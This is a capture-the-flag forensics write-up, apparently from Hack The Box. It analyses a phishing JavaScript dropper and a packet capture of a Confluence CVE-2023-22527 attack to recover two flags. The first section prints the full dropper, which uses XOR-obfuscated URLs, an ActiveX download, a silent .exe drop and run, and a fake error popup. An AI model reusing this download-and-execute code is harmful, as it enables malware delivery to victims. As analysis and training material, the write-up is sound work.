
# Forensics

## Glowup

We managed to retrieve some artifacts from a recent phishing incident. To further investigate the attack we need to analyse the provided document. Examine it and find out what the next steps of the malware are.

### Solution

Checking provided zip file. After extracting it I found artifacts.js file.

![](Pasted%20image%2020241202135134.png)

```javascript
var urls = ["loqKjo3E0dGTl4yfl5mMkYuO0JaKnNGJjtOXkJ2Si5qbjdGJlZ2Jx87MzsvR", "loqKjo3E0dGZm5HTl4rQloqc0Z2NjdGPzYTNkpSRzcfK0baqvIXOnJiLjZ3Kis+QmaGKls2hrYqMz5CZjaHPjaGQzoqhzZDOi5mWgw==", "loqKjo3E0dGdn4ybm4zQloqc0YmO052RkIqbkIrRzpCEjo6Gj8rH0Q==", "loqKjo3E0dGZm5HTl4rQloqc0Z2NjdGPzYTNkpSRzcfK0Q==", "loqKjsTR0YmJidCdnJCQm4mNmpeMm52K0JaKnNGJkYyajoybjY3Ry5LPlY6GysvR", "loqKjo3E0dGVn4yHn4qWn5LQloqc0YmO052RkIqbkIrRzM3P0Q=="],
    activeXObject = "ActiveXObject";

function xd(e, n) {
    for (var t = new Uint8Array(e.length), l = 0; l < e.length; l++) t[l] = e[l] ^ n;
    return t
}

function bnx(e, n) {
    for (var t = atob(e), l = new Uint8Array(t.length), o = 0; o < t.length; o++) l[o] = t.charCodeAt(o);
    return xd(l, n)
}

function dd(e) {
    var n = new activeXObject("MSXML2.XMLHTTP");
    return (n.open("GET", e, !1), n.send(), 200 == n.status) ? n.ResponseBody : null
}

function gop() {
    var e = new activeXObject("Scripting.FileSystemObject"),
        n = "\\" + Math.random().toString(36).substr(2, 9) + ".exe";
    return e.GetSpecialFolder(2) + n
}

function snr(e) {
    var n = gop(),
        t = new activeXObject("ADODB.Stream");
    t.Open(), t.Type = 1, t.Write(e), t.Position = 0, t.SaveToFile(n, 2), t.Close(), new activeXObject("WScript.Shell").Run(n)
}

function start(e, n) {
    WshShell = WScript.CreateObject("WScript.Shell"), Text = atob("VGhlcmUgd2FzIGFuIGVycm9yIG9wZW5pbmcgdGhpcyBkb2N1bWVudC4gVGhlIGZpbGUgaXMgZGFtYWdlZCBhbmQgY291bGQgbm90IGJlIHJlcGFpcmVkIChmb3IgZXhhbXBsZSwgaXQgd2FzIHNlbnQgYXMgYW4gZW1haWwgYXR0YWNobWVudCBhbmQgd2Fzbid0IGNvcnJlY3RseSBkZWNvZGVkKS4"), Title = atob("Tm90IFN1cHBvcnRlZCBGaWxlIEZvcm1hdA=="), Res = WshShell.Popup(Text, 0, Title, 64), n && snr(e)
}
for (var i = 0; i < urls.length; i++) var decodedData = bnx(urls[i], 254),
    data = dd(String.fromCharCode.apply(null, decodedData));
```

I made changes to below function and ran JS online

```js
function dd(e) {
    console.log(e)
    return;
    var n = new activeXObject("MSXML2.XMLHTTP");
    return (n.open("GET", e, !1), n.send(), 200 == n.status) ? n.ResponseBody : null
}
```

This logged below result

```
https://miraigroup.htb/wp-includes/wkcw90205/
https://geo-it.htb/css/q3z3ljo394/HTB{0bfusc4t1ng_th3_Str1ngs_1s_n0t_3n0ugh}
https://career.htb/wp-content/0nzppxq49/
https://geo-it.htb/css/q3z3ljo394/
http://www.cbnnewsdirect.htb/wordpress/5l1kpx45/
https://karyathal.htb/wp-content/231/
```

And found the flag `HTB{0bfusc4t1ng_th3_Str1ngs_1s_n0t_3n0ugh}`

## Merging rivers

We have noticed lately that some Pages in our Knowledge base have been altered and reflected bad practices! We have checked our Confluence users but we didn't find anything out of place... However, we did have a network capture somewhere that might be of help! Can you help us out by finding how the attacker managed to get access to our Knowledge base? Hopefully when found, we can fix it so it wont happen again!

### Approach

Extracted given zip file. Got capture.pcapng file

![](Pasted%20image%2020241202135547.png)

Checking http protocol as description says this is regarding confluence page.

![](Pasted%20image%2020241202141245.png)

After checking some packets, it was clear that attacker was abusing `CVE-2023-22527`. 
After going through all http packets lastly I found the packet where attacker was trying to get RCE.

![](Pasted%20image%2020241202141540.png)

After decoding the `jwt.private.key` I found the flag.

```
┌──[hexadivine@hackthebox]─[~]
└──╼ $ echo SFRCe0FuMHRoM3JfZDR5XzRuMHRoM3JfYzBuZmx1M25jM19SQzMhIX0= | base64 -d
HTB{An0th3r_d4y_4n0th3r_c0nflu3nc3_RC3!!}
```